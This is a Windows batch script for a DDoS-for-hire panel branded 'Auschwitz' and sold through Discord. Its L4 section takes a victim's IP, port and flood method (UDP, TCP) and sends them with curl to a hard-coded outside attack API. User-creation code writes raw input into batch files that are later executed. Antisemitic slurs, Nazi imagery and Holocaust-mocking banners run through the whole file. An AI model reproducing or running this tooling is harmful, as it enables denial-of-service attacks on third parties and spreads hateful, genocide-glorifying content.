@echo off
chcp 65001 >nul
mode 82,24
set version=1.1
set /a som1=%random% %%21
set /a som2=%random% %%74
set /a awnser=%som1%+%som2%
call assets/options.bat
call assets/branding/title.bat

set /a $jews=0 +%fake-jews%
set /a $germans=1 +%fake-germans%

goto licensing
:licensing
if exist assets\license.eccl goto login
if not exist assets\license.eccl goto token


:token
if exist assets\tokens\ds8KpcAMqf.eccl goto login
if exist assets\tokens\CJ0XTGL92U.eccl goto login
if exist assets\tokens\P2VVs3UBJG.eccl goto login
if exist assets\tokens\8HZ0D1Zfxz.eccl goto login
if exist assets\tokens\CPWdO9YP7o.eccl goto login
if exist assets\tokens\SxygW9LJVU.eccl goto login
if exist assets\tokens\zH3kRmc8wM.eccl goto login
if exist assets\tokens\IB7PPabKdt.eccl goto login
if exist assets\tokens\MJ514FaYnh.eccl goto login
if exist assets\tokens\2yMwOCFDU4.eccl goto login
if exist assets\tokens\MswbM0FtCa.eccl goto login
if not exist assets\tokens\ds8KpcAMqf.eccl goto denied2
if not exist assets\tokens\CJ0XTGL92U.eccl goto deined2
if not exist assets\tokens\P2VVs3UBJG.eccl goto denied2
if not exist assets\tokens\8HZ0D1Zfxz.eccl goto denied2
if not exist assets\tokens\CPWdO9YP7o.eccl goto denied2
if not exist assets\tokens\SxygW9LJVU.eccl goto denied2
if not exist assets\tokens\zH3kRmc8wM.eccl goto denied2
if not exist assets\tokens\IB7PPabKdt.eccl goto denied2
if not exist assets\tokens\MJ514FaYnh.eccl goto denied2
if not exist assets\tokens\2yMwOCFDU4.eccl goto denied2
if not exist assets\tokens\MswbM0FtCa.eccl goto denied2

:denied2
title no license or token
color E
echo message Galaxyy#6685 on discord to buy, if not your not welcome in here
timeout 5 >nul
cls
exit
:denied
title Not licensed
color E
echo You don't have a license fucking jew, fuck off!
timeout 5 >nul
cls
exit

:login
title Auschwitz Login
set /p user=[40;37mlogin as:[38;2;255;0;0m 
IF EXIST assets/database/"%user%.getlogin.bat" goto passlogin
cls
goto denied2
:passlogin
call assets/database/%user%.getlogin.bat
set /p pass=[40;37m%user%@Auschwitz's password: [30;40m
if %pass%==%legitpass% goto captcha
goto failed

:failed
color E
cls
echo you failed your login you dirty jew
timeout 3 >nul
exit
:captcha
title Captcha
cls
echo                      [38;2;255;0;0m  ╔═╗╦ ╦╔╦╗╦ ╦╔═╗╔╗╔╔╦╗╦╔═╗╔═╗╔╦╗╦╔═╗╔╗╔
echo                      [38;2;255;0;0m  ╠═╣║ ║ ║ ╠═╣║╣ ║║║ ║ ║║  ╠═╣ ║ ║║ ║║║║
echo                      [38;2;255;0;0m  ╩ ╩╚═╝ ╩ ╩ ╩╚═╝╝╚╝ ╩ ╩╚═╝╩ ╩ ╩ ╩╚═╝╝╚╝
echo                                     [40;37m  %som1% + %som2%
set /p agree=[40;37m[[38;2;255;0;0m%user%@Auschwitz[40;37m]:~# 
if '%agree%' =='%awnser%' goto loading
if not '%agree%' =='%awnser%' echo Try again
set /p a=
set /p a=
set /p a=
set /p a=
call inactive.vbs
exit
:loading
call assets/branding/title.bat
title %au%
cls
echo                             Welcome To Auschwitz!
echo                                 Loading [0%%]
ping localhost -n 1 >nul
cls
echo                             Welcome To Auschwitz!
echo                                  Loading [0%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [1%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [2%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [3%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [4%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [5%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [6%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [7%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [8%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [9%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [10%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [11%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [12%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [13%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [14%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [15%%] 
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [16%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [17%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [18%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [19%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [20%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [21%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [22%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [23%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [24%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [25%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [26%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [27%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [28%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [29%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [30%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [31%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [32%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [33%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [34%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [35%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [36%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [37%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [38%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [39%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [40%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [41%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [42%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [43%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [44%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [45%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [46%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [47%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [48%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [49%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [50%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [51%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [52%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [53%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [54%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [55%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [56%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [57%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [58%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [59%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [60%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [61%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [62%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [63%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [64%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [65%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [66%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [67%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [68%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [69%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [70%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [71%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [72%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [73%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [74%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [75%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [76%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [77%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [78%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [79%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [80%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [81%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [82%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [83%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [84%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [85%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [86%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [87%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [88%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [89%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [90%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [91%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [92%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [93%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [94%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [95%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [96%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [97%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [98%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [99%%]
ping localhost -n 1 >nul
cls
echo                              Welcome To Auschwitz!
echo                                  Loading [100%%]
ping localhost -n 1 >nul
cls
goto x

:x
cls
echo                            ╔═╗                      
echo                            ╠═╣                      
echo                            ╩ ╩
ping localhost -n 1 >nul
cls
echo                            ╔═╗                      
echo                            ╠═╣                      
echo                            ╩ ╩
ping localhost -n 1 >nul
cls
echo                            ╔═╗                      
echo                            ╠═╣                      
echo                            ╩ ╩
ping localhost -n 1 >nul
cls
echo                            ╔═╗                      
echo                            ╠═╣                      
echo                            ╩ ╩
ping localhost -n 1 >nul
cls
echo                            ╔═╗                      
echo                            ╠═╣                      
echo                            ╩ ╩
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦                   
echo                            ╠═╣║ ║                   
echo                            ╩ ╩╚═╝  
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦                   
echo                            ╠═╣║ ║                   
echo                            ╩ ╩╚═╝  
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦                   
echo                            ╠═╣║ ║                   
echo                            ╩ ╩╚═╝  
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦                   
echo                            ╠═╣║ ║                   
echo                            ╩ ╩╚═╝  
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦                   
echo                            ╠═╣║ ║                   
echo                            ╩ ╩╚═╝  
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗                
echo                            ╠═╣║ ║╚═╗                
echo                            ╩ ╩╚═╝╚═╝ 
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗                
echo                            ╠═╣║ ║╚═╗                
echo                            ╩ ╩╚═╝╚═╝ 
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗                
echo                            ╠═╣║ ║╚═╗                
echo                            ╩ ╩╚═╝╚═╝ 
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗                
echo                            ╠═╣║ ║╚═╗                
echo                            ╩ ╩╚═╝╚═╝ 
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗                
echo                            ╠═╣║ ║╚═╗                
echo                            ╩ ╩╚═╝╚═╝ 
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗╔═╗             
echo                            ╠═╣║ ║╚═╗║               
echo                            ╩ ╩╚═╝╚═╝╚═╝ 
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗╔═╗             
echo                            ╠═╣║ ║╚═╗║               
echo                            ╩ ╩╚═╝╚═╝╚═╝ 
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗╔═╗             
echo                            ╠═╣║ ║╚═╗║               
echo                            ╩ ╩╚═╝╚═╝╚═╝ 
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗╔═╗             
echo                            ╠═╣║ ║╚═╗║               
echo                            ╩ ╩╚═╝╚═╝╚═╝ 
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗╔═╗╦ ╦          
echo                            ╠═╣║ ║╚═╗║  ╠═╣          
echo                            ╩ ╩╚═╝╚═╝╚═╝╩ ╩ 
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗╔═╗╦ ╦          
echo                            ╠═╣║ ║╚═╗║  ╠═╣          
echo                            ╩ ╩╚═╝╚═╝╚═╝╩ ╩ 
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗╔═╗╦ ╦          
echo                            ╠═╣║ ║╚═╗║  ╠═╣          
echo                            ╩ ╩╚═╝╚═╝╚═╝╩ ╩ 
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗╔═╗╦ ╦          
echo                            ╠═╣║ ║╚═╗║  ╠═╣          
echo                            ╩ ╩╚═╝╚═╝╚═╝╩ ╩ 
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗╔═╗╦ ╦          
echo                            ╠═╣║ ║╚═╗║  ╠═╣          
echo                            ╩ ╩╚═╝╚═╝╚═╝╩ ╩ 
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗╔═╗╦ ╦╦ ╦       
echo                            ╠═╣║ ║╚═╗║  ╠═╣║║║       
echo                            ╩ ╩╚═╝╚═╝╚═╝╩ ╩╚╩╝
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗╔═╗╦ ╦╦ ╦       
echo                            ╠═╣║ ║╚═╗║  ╠═╣║║║       
echo                            ╩ ╩╚═╝╚═╝╚═╝╩ ╩╚╩╝
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗╔═╗╦ ╦╦ ╦       
echo                            ╠═╣║ ║╚═╗║  ╠═╣║║║       
echo                            ╩ ╩╚═╝╚═╝╚═╝╩ ╩╚╩╝
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗╔═╗╦ ╦╦ ╦       
echo                            ╠═╣║ ║╚═╗║  ╠═╣║║║       
echo                            ╩ ╩╚═╝╚═╝╚═╝╩ ╩╚╩╝
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗╔═╗╦ ╦╦ ╦       
echo                            ╠═╣║ ║╚═╗║  ╠═╣║║║       
echo                            ╩ ╩╚═╝╚═╝╚═╝╩ ╩╚╩╝
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗╔═╗╦ ╦╦ ╦╦      
echo                            ╠═╣║ ║╚═╗║  ╠═╣║║║║      
echo                            ╩ ╩╚═╝╚═╝╚═╝╩ ╩╚╩╝╩  
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗╔═╗╦ ╦╦ ╦╦      
echo                            ╠═╣║ ║╚═╗║  ╠═╣║║║║      
echo                            ╩ ╩╚═╝╚═╝╚═╝╩ ╩╚╩╝╩  
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗╔═╗╦ ╦╦ ╦╦      
echo                            ╠═╣║ ║╚═╗║  ╠═╣║║║║      
echo                            ╩ ╩╚═╝╚═╝╚═╝╩ ╩╚╩╝╩  
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗╔═╗╦ ╦╦ ╦╦      
echo                            ╠═╣║ ║╚═╗║  ╠═╣║║║║      
echo                            ╩ ╩╚═╝╚═╝╚═╝╩ ╩╚╩╝╩  
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗╔═╗╦ ╦╦ ╦╦      
echo                            ╠═╣║ ║╚═╗║  ╠═╣║║║║      
echo                            ╩ ╩╚═╝╚═╝╚═╝╩ ╩╚╩╝╩  
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗╔═╗╦ ╦╦ ╦╦╔╦╗   
echo                            ╠═╣║ ║╚═╗║  ╠═╣║║║║ ║    
echo                            ╩ ╩╚═╝╚═╝╚═╝╩ ╩╚╩╝╩ ╩ 
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗╔═╗╦ ╦╦ ╦╦╔╦╗   
echo                            ╠═╣║ ║╚═╗║  ╠═╣║║║║ ║    
echo                            ╩ ╩╚═╝╚═╝╚═╝╩ ╩╚╩╝╩ ╩ 
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗╔═╗╦ ╦╦ ╦╦╔╦╗   
echo                            ╠═╣║ ║╚═╗║  ╠═╣║║║║ ║    
echo                            ╩ ╩╚═╝╚═╝╚═╝╩ ╩╚╩╝╩ ╩ 
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗╔═╗╦ ╦╦ ╦╦╔╦╗   
echo                            ╠═╣║ ║╚═╗║  ╠═╣║║║║ ║    
echo                            ╩ ╩╚═╝╚═╝╚═╝╩ ╩╚╩╝╩ ╩ 
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗╔═╗╦ ╦╦ ╦╦╔╦╗   
echo                            ╠═╣║ ║╚═╗║  ╠═╣║║║║ ║    
echo                            ╩ ╩╚═╝╚═╝╚═╝╩ ╩╚╩╝╩ ╩ 
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗╔═╗╦ ╦╦ ╦╦╔╦╗╔═╗
echo                            ╠═╣║ ║╚═╗║  ╠═╣║║║║ ║ ╔═╝
echo                            ╩ ╩╚═╝╚═╝╚═╝╩ ╩╚╩╝╩ ╩ ╚═╝
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗╔═╗╦ ╦╦ ╦╦╔╦╗╔═╗
echo                            ╠═╣║ ║╚═╗║  ╠═╣║║║║ ║ ╔═╝
echo                            ╩ ╩╚═╝╚═╝╚═╝╩ ╩╚╩╝╩ ╩ ╚═╝
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗╔═╗╦ ╦╦ ╦╦╔╦╗╔═╗
echo                            ╠═╣║ ║╚═╗║  ╠═╣║║║║ ║ ╔═╝
echo                            ╩ ╩╚═╝╚═╝╚═╝╩ ╩╚╩╝╩ ╩ ╚═╝
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗╔═╗╦ ╦╦ ╦╦╔╦╗╔═╗
echo                            ╠═╣║ ║╚═╗║  ╠═╣║║║║ ║ ╔═╝
echo                            ╩ ╩╚═╝╚═╝╚═╝╩ ╩╚╩╝╩ ╩ ╚═╝
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗╔═╗╦ ╦╦ ╦╦╔╦╗╔═╗
echo                            ╠═╣║ ║╚═╗║  ╠═╣║║║║ ║ ╔═╝
echo                            ╩ ╩╚═╝╚═╝╚═╝╩ ╩╚╩╝╩ ╩ ╚═╝
ping localhost -n 1 >nul
cls
echo                            ╔═╗╦ ╦╔═╗╔═╗╦ ╦╦ ╦╦╔╦╗╔═╗
echo                            ╠═╣║ ║╚═╗║  ╠═╣║║║║ ║ ╔═╝
echo                            ╩ ╩╚═╝╚═╝╚═╝╩ ╩╚╩╝╩ ╩ ╚═╝
ping localhost -n 1 >nul
cls
goto greeting


:greeting
cls
echo [40;37mWelcome to Auschwitz: [38;2;255;0;0m%user%
echo                         [40;37m╦ ╦╦ ╦╦╔╦╗╔═╗  [38;2;255;0;0m╔═╗╔═╗╦ ╦╔═╗╦═╗
echo                         [40;37m║║║╠═╣║ ║ ║╣   [38;2;255;0;0m╠═╝║ ║║║║║╣ ╠╦╝
ECHO                         [40;37m╚╩╝╩ ╩╩ ╩ ╚═╝  [38;2;255;0;0m╩  ╚═╝╚╩╝╚═╝╩╚═
echo                              [38;2;255;0;0m████[40;37m╗   [38;2;255;0;0m████████████[40;37m╗
echo                              [38;2;255;0;0m████[40;37m║   [38;2;255;0;0m████████████[40;37m║
echo                              [38;2;255;0;0m████[40;37m║   [38;2;255;0;0m████[40;37m╔═══════[40;37m╝
echo                              [38;2;255;0;0m████[40;37m║   [38;2;255;0;0m████[40;37m║
echo                              [38;2;255;0;0m████████████████████[40;37m╗  
echo                            [38;2;255;0;0m  ████████████████████[40;37m║ 
echo                              [40;37m╚═══════[38;2;255;0;0m████[40;37m╔═══[38;2;255;0;0m████[40;37m║
echo                                      [38;2;255;0;0m████[40;37m║   [38;2;255;0;0m████[40;37m║
echo                              [38;2;255;0;0m████████████[40;37m║   [38;2;255;0;0m████[40;37m║
echo                              [38;2;255;0;0m████████████[40;37m║   [38;2;255;0;0m████[40;37m║
echo                              [40;37m╚═══════════╝   [40;37m╚═══╝
echo                       [40;37m╔════════════════[38;2;255;0;0m═══════════════╗
echo                       [40;37m║ GASSIN CONNECTI[38;2;255;0;0mONS SINCE 1941 ║
echo                       [40;37m╚════════════════[38;2;255;0;0m═══════════════╝       






set /p o=[40;37m[[38;2;255;0;0m%user%@Auschwitz[40;37m]:~# 

if %o%==help goto help 
if %o%==cls goto greeting 
if %o%==rules goto tos
if %o%==banners goto banners
if %o%==superior goto superior
if %o%==Auschwitz goto nazi
if %o%==hitler goto hitler
if %o%==methods goto methods
if %o%==putin goto putin
if %o%==attack goto attack
if %o%==!L4 goto L4

if %o%==OVH/NFO goto OVH/NFO
if %o%==Layer7 goto Layer7
if %o%==HOME/OTHER goto HOME/OTHER
if %o%==send goto send
if %o%==exit goto exit
if %o%==users-add goto mku
if %o%==passwd goto chngpasw
if %o%==credits goto crdts

if %o%==nul cls
goto greeting

if not %o%==help goto wrong
if not %o%==cls goto wrong
if not %o%==rules goto wrong
if not %o%==banners goto wrong
if not %o%==superior goto wrong
if not %o%==Auschwitz goto wrong
if not %o%==hitler goto wrong
if not %o%==methods goto wrong
if not %o%==putin goto wrong
if not %o%==attack goto wrong
if not %o%==OVH/NFO goto wrong
if not %o%==Layer7 goto wrong
if not %o%==HOME/OTHER goto wrong
if not %o%==send goto wrong
if not %o%==!L4 goto wrong
if not %o%==exit goto wrong
if not %o%==users-add goto wrong
if not %o%==passwd goto wrong
if not %o%==credits goto wrong

:mku  
set /p registeruser=Please specify a name: 
goto registerpass
:registerpass
set /p registerpass=Specify a password: 
echo set legitpass=%registerpass% > assets/database/%registeruser%.getlogin.bat
echo User %registeruser% Successfully Created!
goto greeting

:L4
set /p ip_input="IP: "
set /p port_input="PORT: "
set max_time="30"
set m=METHODS: UDP, TCP
echo %m%
set /p method_input="METHOD: 
set api="http://135.148.44.27:1771/Furher.php/?key=12345&ip=%ip_input%&port=%port_input%&max_time=%max_time%&method=%method_input%"
curl -s -d --raw %api%
goto attack

:crdts
set program=Auschwitz
set version=1.1
set variant=Digital
echo.
echo [38;2;255;0;0m##################################################################################
echo [40;97;1m    This source was fully developed by [38;2;255;0;0m[[40;97;1m@Galaxyy#6685[38;2;255;0;0m][40;97;1m ^& [38;2;255;0;0m[[40;97;1mrp#0004[38;2;255;0;0m] [40;97;1mon Discord.
echo [40;97;1m         Design: Mostly done by [38;2;255;0;0m[[40;97;1m@Galaxyy#6685[38;2;255;0;0m][40;97;1m, also added some functions.
echo [40;97;1m                  Functions: Written ^& Developed by [38;2;255;0;0m[[40;97;1m@rp#0004[38;2;255;0;0m][40;97;1m.
echo.
echo [40;97;1m                    This is: [38;2;255;0;0m([40;97;1m%program% [38;2;255;0;0m%version% [40;97;1m%variant% Edition[38;2;255;0;0m)
echo [38;2;255;0;0m##################################################################################
echo.
goto wrong2

:wrong2
set /p o=[40;37m[[38;2;255;0;0m%user%@Auschwitz[40;37m]:~# 
if %o%==help goto help 
if %o%==cls goto greeting 
if %o%==rules goto tos
if %o%==banners goto banners
if %o%==superior goto superior
if %o%==Auschwitz goto nazi
if %o%==hitler goto hitler
if %o%==methods goto methods
if %o%==putin goto putin
if %o%==attack goto attack
if %o%==OVH/NFO goto OVH/NFO
if %o%==Layer7 goto Layer7
if %o%==HOME/OTHER goto HOME/OTHER
if %o%==send goto send
if %o%==passwd goto chngpasw

if not %o%==help goto wrong
if not %o%==cls goto wrong
if not %o%==rules goto wrong
if not %o%==banners goto wrong
if not %o%==superior goto wrong
if not %o%==Auschwitz goto wrong
if not %o%==hitler goto wrong
if not %o%==methods goto wrong
if not %o%==putin goto wrong
if not %o%==attack goto wrong
if not %o%==OVH/NFO goto wrong
if not %o%==Layer7 goto wrong
if not %o%==HOME/OTHER goto wrong
if not %o%==send goto wrong
if not %o%==passwd goto wrong

:chngpasw
set /p newpass=Please set a new password: 
type nul > assets/database/%user%.getlogin.bat
echo set legitpass=%newpass% > assets/database/%user%.getlogin.bat
echo Password Successfully Changed!
timeout 3 >nul
goto greeting 



:methods
cls
echo                                ╔══════════════╗
echo                                ║ OVH/NFO      ║
echo                                ║ HOME/OTHER   ║
echo                                ║ Layer7       ║
echo                                ╚══════════════╝
set /p o=[40;37m[[38;2;255;0;0m%user%@Auschwitz[40;37m]:~# 

:help
cls
echo             [40;37m                    ╔══════════════════╗
echo             [40;37m                    ║    Auschwitz.    ║
echo             [40;37m       ╔════════════╩══════════════════╩════════════╗
echo             [40;37m       ║ methods : lists out method menus           ║
echo             [40;37m       ║ status : view account information          ║
echo             [40;37m       ║ banners : change your banner               ║
echo             [40;37m       ║ rules : view our terms of service          ║
echo             [40;37m       ║ credits : all credits                      ║
echo             [40;37m       ║ cls : clear your terminal                  ║
echo             [40;37m       ║ exit : exit the terminal                   ║
echo             [40;37m       ╚════════════════════════════════════════════╝
set /p o=[40;37m[[38;2;255;0;0m%user%@Auschwitz[40;37m]:~# 
if %o%==help goto help 
if %o%==cls goto greeting 
if %o%==rules goto tos
if %o%==banners goto banners
if %o%==superior goto superior
if %o%==Auschwitz goto nazi
if %o%==hitler goto hitler
if %o%==methods goto methods
if %o%==putin goto putin
if %o%==attack goto attack
if %o%==OVH/NFO goto OVH/NFO
if %o%==Layer7 goto Layer7
if %o%==HOME/OTHER goto HOME/OTHER
if %o%==send goto send
if %o%==passwd goto chngpasw

if not %o%==help goto wrong
if not %o%==cls goto wrong
if not %o%==rules goto wrong
if not %o%==banners goto wrong
if not %o%==superior goto wrong
if not %o%==Auschwitz goto wrong
